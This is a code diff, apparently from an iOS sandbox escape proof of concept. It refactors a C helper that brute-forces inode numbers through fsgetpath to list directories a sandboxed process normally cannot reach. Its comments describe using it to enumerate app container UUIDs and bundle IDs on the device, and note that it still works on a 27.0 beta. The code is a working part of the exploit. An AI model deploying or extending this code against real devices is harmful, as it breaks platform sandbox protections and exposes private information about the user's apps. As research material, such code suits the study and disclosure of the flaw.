@@ -259,34 +259,38 @@ void bad_query_mha_release(int64_t object_handle) {
 // This still works on 27.0b5
 // I'm including it here because it's very useful in the context of this sandbox escape, which can't access parent directories (most of the time)
 // This enumerates all directories in a given path, so you can, for example, get all container UUIDs, read their container metadata to get their bundle ID, and derive that entirely on-device without a computer
-char *bad_query_list(char *path, int64_t max_inode) {
+char *bad_query_list_range(char *path, int64_t start_inode, int64_t end_inode) {
     struct statfs sfs;
     if (statfs(path, &sfs) != 0) return NULL;
     fsid_t fsid = sfs.f_fsid;
-    
+
     size_t cap = 65536;
     size_t length = 0;
     size_t path_length = strlen(path);
-    
+
     char *out = malloc(cap);
     if (!out) return NULL;
     out[0] = '\0';
-    
+
     char buf[1200];
-    for (uint64_t ino = 1; ino <= max_inode; ino++) {
+    for (uint64_t ino = (uint64_t)start_inode; ino <= (uint64_t)end_inode; ino++) {
         ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
         if (n <= 0) continue;
-        
+
         const char *p = buf;
         if (strncmp(p, "/private/var/", 13) == 0) p += 8;
         if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
         if (strchr(p + path_length + 1, '/')) continue;
-        
+
         size_t need = strlen(p) + 2;
         if (length + need > cap) { cap *= 2; char *t = realloc(out, cap); if (!t) break; out = t; }
         length += snprintf(out + length, cap - length, "%s\n", p);
     }
     return out;
+}
+
+char *bad_query_list(char *path, int64_t max_inode) {
+    return bad_query_list_range(path, 1, max_inode);
 }
 
 // MARK: - Sandbox Escape PoC
